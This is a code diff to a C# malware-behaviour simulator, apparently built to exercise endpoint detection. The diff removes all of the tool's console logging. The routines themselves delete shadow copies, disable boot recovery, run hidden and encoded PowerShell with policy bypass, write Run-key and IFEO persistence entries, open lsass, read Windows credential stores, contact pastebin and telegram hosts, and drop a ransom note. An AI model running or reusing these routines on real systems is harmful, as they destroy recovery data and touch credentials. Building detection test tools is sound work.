@@ -185,9 +185,8 @@ public static class Simulator
         {
             using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(4) };
             _ = await http.GetStringAsync("https://www.google.com", ct);
-            Log("  Connected to www.google.com");
         }
-        catch { Log("  (no network connection)"); }
+        catch { }
         await Task.Delay(500, ct);
     }
 
@@ -198,7 +197,6 @@ public static class Simulator
             ct.ThrowIfCancellationRequested();
             string p = Path.Combine(Drop, $"cache_{i}.dat");
             await File.WriteAllTextAsync(p, $"cached value {i}", ct);
-            Log($"  Wrote: {Path.GetFileName(p)}");
             await Task.Delay(500, ct);
         }
     }
@@ -220,7 +218,7 @@ public static class Simulator
 
     static async Task RunSuspicious(CancellationToken ct)
     {
-        Step("Scanning through personal folders and browser data locations");
+        Step("Scanning through system and application folders");
         await Sus_DirectoryEnum(ct);
 
         Step("Running tools to gather information about this computer");
@@ -262,7 +260,6 @@ public static class Simulator
             string p = Path.Combine(workDir, $"normal_{tick++}.dat");
             await File.WriteAllTextAsync(p, $"normal data {tick}", ct);
             await Task.Delay(1800, ct);
-            Log($"  tick {tick} — writing at normal pace");
         }
 
         Console.ForegroundColor = ConsoleColor.Yellow;
@@ -289,7 +286,7 @@ public static class Simulator
         {
             ct.ThrowIfCancellationRequested();
             string p = Path.Combine(workDir, $"spike_{spikeTick++}.dat");
-            await File.WriteAllTextAsync(p, $"spike data {spikeTick}", ct);
+            await File.WriteAllBytesAsync(p, Encoding.UTF8.GetBytes(new string('A', 512)), ct);
             await Task.Delay(15, ct);
         }
 
@@ -317,7 +314,6 @@ public static class Simulator
         {
             bytes = new byte[512];
             bytes[0] = 0x4D; bytes[1] = 0x5A;
-            Log("  (offline — using placeholder file bytes)");
         }
 
         string exePath = Path.Combine(staging, "svcupdate.exe");
@@ -330,14 +326,12 @@ public static class Simulator
         await File.WriteAllTextAsync(ps1Path, "# stage loader", ct);
         await File.WriteAllTextAsync(dllPath, "MZ", ct);
 
-        Log($"  Hidden in: {staging}");
         _extraDirs.Add(staging);
         await Task.Delay(1000, ct);
     }
 
     static async Task Mal_LolbinExecution(CancellationToken ct)
     {
-        Log("  Opening PowerShell with a hidden bypass command...");
         await Spawn("powershell.exe",
             "-ExecutionPolicy Bypass -NoProfile -Command \"Write-Host 'payload executed'; Start-Sleep 2\"",
             showWindow: true);
@@ -348,11 +342,9 @@ public static class Simulator
         await Spawn("powershell.exe", $"-EncodedCommand {encoded}", showWindow: true);
         await Task.Delay(1500, ct);
 
-        Log("  Using Windows Management tools to open a hidden process...");
         await Spawn("wmic.exe", "process call create \"cmd.exe /c echo WMI Spawned\"");
         await Task.Delay(1000, ct);
 
-        Log("  Using certutil (a trusted Windows tool) to disguise activity...");
         await Spawn("certutil.exe",
             "-hashfile \"" + Environment.GetCommandLineArgs()[0] + "\" MD5");
         await Task.Delay(1000, ct);
@@ -363,19 +355,16 @@ public static class Simulator
         const string runKey  = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
         const string valName = "SimUpdate";
 
-        Log($"  Writing to startup registry — will run on every login...");
         using (var key = Registry.CurrentUser.OpenSubKey(runKey, writable: true))
             key?.SetValue(valName, @"C:\Windows\Temp\svcupdate.exe");
         await Task.Delay(2000, ct);
 
-        Log("  Cleaning up the registry entry...");
         using (var key = Registry.CurrentUser.OpenSubKey(runKey, writable: true))
             key?.DeleteValue(valName, throwOnMissingValue: false);
 
-        Log("  Reading login settings from Winlogon...");
         using var wl = Registry.LocalMachine.OpenSubKey(
             @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
-        Log($"  Userinit = {wl?.GetValue("Userinit") ?? "(no access)"}");
+        _ = wl?.GetValue("Userinit");
         await Task.Delay(500, ct);
     }
 
@@ -394,16 +383,14 @@ public static class Simulator
             Path.Combine(appdata, "Mozilla", "Firefox", "Profiles"),
         };
 
-        Log("  Checking for saved browser passwords and SSH keys...");
         foreach (var target in probeTargets)
         {
             ct.ThrowIfCancellationRequested();
-            try   { Log($"  {(File.Exists(target) || Directory.Exists(target) ? "[found]" : "[not found]")} {target}"); }
-            catch { Log($"  [denied] {target}"); }
+            try   { _ = File.Exists(target) || Directory.Exists(target); }
+            catch { }
             await Task.Delay(200, ct);
         }
 
-        Log("  Trying to read Windows password protection store...");
         string protectDir = Path.Combine(appdata, "Microsoft", "Protect");
         try
         {
@@ -415,15 +402,13 @@ public static class Simulator
                     using var fs = File.Open(entry, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                     byte[] buf = new byte[Math.Min((int)fs.Length, 32)];
                     _ = await fs.ReadAsync(buf, ct);
-                    Log($"  [read] {entry}");
                 }
-                catch { Log($"  [denied] {entry}"); }
+                catch { }
                 await Task.Delay(150, ct);
             }
         }
-        catch { Log($"  [no access] {protectDir}"); }
+        catch { }
 
-        Log("  Trying to read Windows Credential Manager...");
         string credDir = Path.Combine(appdata, "Microsoft", "Credentials");
         try
         {
@@ -435,24 +420,21 @@ public static class Simulator
                     using var fs = File.Open(credFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                     byte[] buf = new byte[Math.Min((int)fs.Length, 32)];
                     _ = await fs.ReadAsync(buf, ct);
-                    Log($"  [read] {credFile}");
                 }
-                catch { Log($"  [denied] {credFile}"); }
+                catch { }
                 await Task.Delay(150, ct);
             }
         }
-        catch { Log($"  [no access] {credDir}"); }
+        catch { }
 
-        Log("  Writing a fake stolen credentials file...");
         string dumpPath = Path.Combine(credDir, "sim_credentials.dump");
         try
         {
             await File.WriteAllTextAsync(dumpPath, "SIM:CREDENTIAL_DUMP:PLACEHOLDER", ct);
-            Log($"  [written] {dumpPath}");
             await Task.Delay(800, ct);
             File.Delete(dumpPath);
         }
-        catch { Log($"  [denied] {dumpPath}"); }
+        catch { }
     }
 
     static async Task Mal_DataStagingAndExfil(CancellationToken ct)
@@ -463,7 +445,6 @@ public static class Simulator
 
         byte[] fakeZip = { 0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00 };
         await File.WriteAllBytesAsync(zipPath, fakeZip, ct);
-        Log($"  Compressed stolen data into: {Path.GetFileName(zipPath)}");
         await Task.Delay(800, ct);
 
         for (int i = 0; i < 4; i++)
@@ -474,22 +455,19 @@ public static class Simulator
             await Task.Delay(50, ct);
         }
 
-        Log("  Resolving external addresses...");
         foreach (var host in new[] { "pastebin.com", "api.telegram.org" })
         {
             ct.ThrowIfCancellationRequested();
-            Log($"  DNS: {host}");
             try { System.Net.Dns.GetHostEntry(host); } catch { }
             await Task.Delay(100, ct);
         }
 
-        Log("  Sending stolen data to external server...");
         using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(3) };
         foreach (var host in new[] { "https://api.github.com", "https://pastebin.com/raw/example" })
         {
             ct.ThrowIfCancellationRequested();
-            try   { _ = await http.GetStringAsync(host, ct); Log($"  Sent to: {host}"); }
-            catch { Log($"  (could not reach {host})"); }
+            try   { _ = await http.GetStringAsync(host, ct); }
+            catch { }
             await Task.Delay(300, ct);
         }
     }
@@ -499,7 +477,6 @@ public static class Simulator
         string rnsmDir = Path.Combine(Drop, "locked_files");
         Directory.CreateDirectory(rnsmDir);
 
-        Log("  Encrypting documents one by one...");
         for (int i = 0; i < 20; i++)
         {
             ct.ThrowIfCancellationRequested();
@@ -511,7 +488,6 @@ public static class Simulator
             await Task.Delay(20, ct);
         }
 
-        Log("  Leaving a ransom note on the desktop...");
         string rnote = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "README_RECOVER_FILES.txt");
         try { await File.WriteAllTextAsync(rnote, "All your files are encrypted.", ct); _extraDirs.Add(rnote); } catch { }
         await Task.Delay(1000, ct);
@@ -519,11 +495,9 @@ public static class Simulator
 
     static async Task Mal_AntiRecovery(CancellationToken ct)
     {
-        Log("  Deleting Windows shadow copies (backups)...");
         await Spawn("vssadmin.exe", "delete shadows /all /quiet", showWindow: false);
         await Task.Delay(1500, ct);
 
-        Log("  Disabling recovery mode at startup...");
         await Spawn("bcdedit.exe", "/set {default} recoveryenabled No", showWindow: false);
         await Task.Delay(1500, ct);
     }
@@ -534,7 +508,6 @@ public static class Simulator
         Directory.CreateDirectory(churnDir);
         var written = new List<string>();
 
-        Log("  Creating and deleting 30 files rapidly to obscure activity...");
         for (int i = 0; i < 30; i++)
         {
             ct.ThrowIfCancellationRequested();
@@ -562,7 +535,6 @@ public static class Simulator
 
     static async Task Mal_Reconnaissance(CancellationToken ct)
     {
-
         (string exe, string args)[] tools =
         {
             ("whoami.exe",     "/all"),
@@ -575,7 +547,6 @@ public static class Simulator
         foreach (var (exe, args) in tools)
         {
             ct.ThrowIfCancellationRequested();
-            Log($"  Running {exe}...");
             await Spawn(exe, args);
             await Task.Delay(500, ct);
         }
@@ -583,100 +554,74 @@ public static class Simulator
 
     static async Task Mal_EnableDebugPrivilege(CancellationToken ct)
     {
-
-        Log("  Requesting SeDebugPrivilege (elevated access to all processes)...");
-        bool ok = NativeMethods.EnableSeDebugPrivilege();
-        Log(ok ? "  Privilege granted." : "  Privilege denied (not running as admin).");
+        NativeMethods.EnableSeDebugPrivilege();
         await Task.Delay(800, ct);
     }
 
     static async Task Mal_DefenseEvasion(CancellationToken ct)
     {
-
         const string ifeoKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sim_target.exe";
-        Log("  Modifying Image File Execution Options to intercept a process launch...");
         try
         {
             using var key = Registry.CurrentUser.CreateSubKey(ifeoKey);
             key?.SetValue("Debugger", @"C:\Windows\Temp\injector.exe");
-            Log($"  Written: {ifeoKey}");
             await Task.Delay(800, ct);
             Registry.CurrentUser.DeleteSubKey(ifeoKey, throwOnMissingSubKey: false);
-            Log("  Cleaned up IFEO entry.");
         }
-        catch { Log("  (access denied — IFEO write skipped)"); }
+        catch { }
 
-        Log("  Launching a hidden PowerShell window...");
         await Spawn("powershell.exe", "-w hidden -ep bypass -nop -c \"Start-Sleep 2\"", showWindow: false);
         await Task.Delay(1000, ct);
     }
 
     static async Task Mal_DpapiExtract(CancellationToken ct)
     {
-
-        Log("  Encrypting a data blob with Windows DPAPI...");
         byte[] plaintext = Encoding.UTF8.GetBytes("SIM:extracted_credential_data");
         byte[]? encrypted = NativeMethods.DpapiProtect(plaintext);
         if (encrypted != null)
-        {
-            Log("  Decrypting the blob — this triggers the DPAPI detection event...");
-            byte[]? decrypted = NativeMethods.DpapiUnprotect(encrypted);
-            Log(decrypted != null ? "  DPAPI decryption succeeded." : "  DPAPI decryption failed.");
-        }
-        else
-        {
-            Log("  DPAPI protect failed — skipping.");
-        }
+            NativeMethods.DpapiUnprotect(encrypted);
         await Task.Delay(500, ct);
     }
 
     static async Task Mal_LsassAccess(CancellationToken ct)
     {
-
         var lsass = Process.GetProcessesByName("lsass").FirstOrDefault();
         if (lsass == null)
         {
-            Log("  lsass.exe not found — skipping.");
             await Task.Delay(300, ct);
             return;
         }
 
-        Log($"  Opening a handle to lsass.exe (PID {lsass.Id})...");
-        IntPtr handle = NativeMethods.OpenProcess(0x0010 , false, lsass.Id);
+        IntPtr handle = NativeMethods.OpenProcess(0x0010, false, lsass.Id);
         if (handle != IntPtr.Zero)
-        {
-            Log("  Handle acquired — Sysmon should have logged this.");
             NativeMethods.CloseHandle(handle);
-        }
-        else
-        {
-            Log("  Access denied — but Sysmon still logs the attempt if running.");
-        }
         await Task.Delay(500, ct);
     }
 
     static async Task Sus_DirectoryEnum(CancellationToken ct)
     {
-        string appdata  = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        string win      = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
+        string progFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
         string localapp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-        string home     = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+        string temp     = Path.GetTempPath();
 
         string[] dirs =
         {
-            Path.Combine(localapp, "Google", "Chrome", "User Data"),
-            Path.Combine(localapp, "Microsoft", "Edge", "User Data"),
-            Path.Combine(appdata,  "Mozilla", "Firefox", "Profiles"),
-            Path.Combine(appdata,  "Microsoft", "Credentials"),
-            Path.Combine(appdata,  "Microsoft", "Protect"),
-            Path.Combine(home, ".ssh"),
-            Path.Combine(home, ".aws"),
-            Path.Combine(home, ".azure"),
+            Path.Combine(win, "System32", "drivers"),
+            Path.Combine(win, "System32", "Tasks"),
+            Path.Combine(win, "Prefetch"),
+            Path.Combine(win, "SysWOW64"),
+            Path.Combine(progFiles, "Common Files"),
+            @"C:\ProgramData",
+            Path.Combine(localapp, "Temp"),
+            Path.Combine(localapp, "Microsoft", "Windows", "INetCache"),
+            temp,
         };
 
         foreach (var dir in dirs)
         {
             ct.ThrowIfCancellationRequested();
-            await ProbeDirectoryAsync(dir, ct, sampleRead: true);
+            await ProbeDirectoryAsync(dir, ct, sampleRead: false);
             await Task.Delay(300, ct);
         }
     }
@@ -696,7 +641,6 @@ public static class Simulator
         foreach (var (exe, args) in commands)
         {
             ct.ThrowIfCancellationRequested();
-            Log($"  Running {exe}...");
             await Spawn(exe, args);
             await Task.Delay(800, ct);
         }
@@ -704,17 +648,14 @@ public static class Simulator
 
     static async Task Sus_ProcessSpawns(CancellationToken ct)
     {
-        Log("  Opening a command window...");
         await Spawn("cmd.exe", "/c echo System check complete");
         await Task.Delay(1000, ct);
 
-        Log("  Running a PowerShell script...");
         await Spawn("powershell.exe",
             "-Command \"Get-Date; Get-Process | Select-Object -First 5\"",
             showWindow: true);
         await Task.Delay(1500, ct);
 
-        Log("  Running certutil (normally used for certificates)...");
         await Spawn("certutil.exe",
             "-hashfile \"" + Environment.GetCommandLineArgs()[0] + "\" SHA256");
         await Task.Delay(1000, ct);
@@ -733,8 +674,8 @@ public static class Simulator
         foreach (var url in urls)
         {
             ct.ThrowIfCancellationRequested();
-            try   { _ = await http.GetStringAsync(url, ct); Log($"  Connected: {url}"); }
-            catch { Log($"  (no route to {url})"); }
+            try   { _ = await http.GetStringAsync(url, ct); }
+            catch { }
             await Task.Delay(500, ct);
         }
     }
@@ -762,11 +703,6 @@ public static class Simulator
         Console.ResetColor();
     }
 
-    static void Log(string msg)
-    {
-        Console.WriteLine(msg);
-    }
-
     static async Task Spawn(string exe, string args, bool showWindow = false)
     {
         try
@@ -787,25 +723,18 @@ public static class Simulator
         ct.ThrowIfCancellationRequested();
 
         if (!Directory.Exists(dir))
-        {
-            Log($"  [not found] {dir}");
             return;
-        }
-
-        Log($"  [found] {dir}");
 
         try
         {
             int shown = 0;
             foreach (var entry in Directory.EnumerateFileSystemEntries(dir))
             {
-                Log($"    {entry}");
                 shown++;
                 if (shown >= 3) break;
             }
-            if (shown == 0) Log("    (empty)");
         }
-        catch { Log($"    (access denied)"); }
+        catch { }
 
         if (!sampleRead) return;
 
@@ -818,9 +747,8 @@ public static class Simulator
             int len = fs.Length > 0 ? (int)Math.Min(fs.Length, 32) : 1;
             byte[] buffer = new byte[len];
             _ = await fs.ReadAsync(buffer, ct);
-            Log($"    [read sample] {sampleFile}");
         }
-        catch { Log($"    [read denied] {sampleFile}"); }
+        catch { }
     }
 
     static string? FindFirstFile(string root, int maxDepth)
